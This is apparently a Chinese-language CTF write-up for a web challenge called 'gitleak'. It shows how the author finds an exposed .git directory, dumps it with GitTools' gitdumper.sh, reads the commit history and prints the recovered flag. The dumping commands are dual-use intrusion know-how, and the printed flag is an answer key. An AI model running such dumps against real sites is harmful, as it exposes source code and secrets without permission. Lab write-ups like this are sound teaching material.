#Web 

## 題目

**gitleak**
給了一個網址，點開來：
![[W1-2_web.png]]
## 解題
1. 題目叫 gitleak -> 檢查是否有 git 版本更新遺留
   ```
   http://chals1:20001/.git/config
   ```
   ![[W1-2_gitconfig.png]]--> 有

2. 下載 [git-Tools](https://github.com/internetwache/GitTools)  工具
   ```bash
   git clone https://github.com/internetwache/GitTools.git
   ```
   進入 git-dumper 資料夾並 dump 題目本地電腦的資料夾 `dumpedWeb` 中
   ```bash
   cd GitTools/Dumper/
   ./gitdumper.sh http://chals1:20001/.git/ dumpedWeb
   cd dumpedWeb/
   ```
3. 終端機輸入 `git log` 查看 log
   ![[W1-2_log.png|557]]
   發現怪怪的 -> 查他！
   ```bash
   git show 2d25d0413ee1bea774387426a34c2c8e256fb3db
   ```
   ![[W1-2_flag.png|547]]
4. flag = `CTF{git_history_1855e8c3e61d1927fcb2c9ad}`


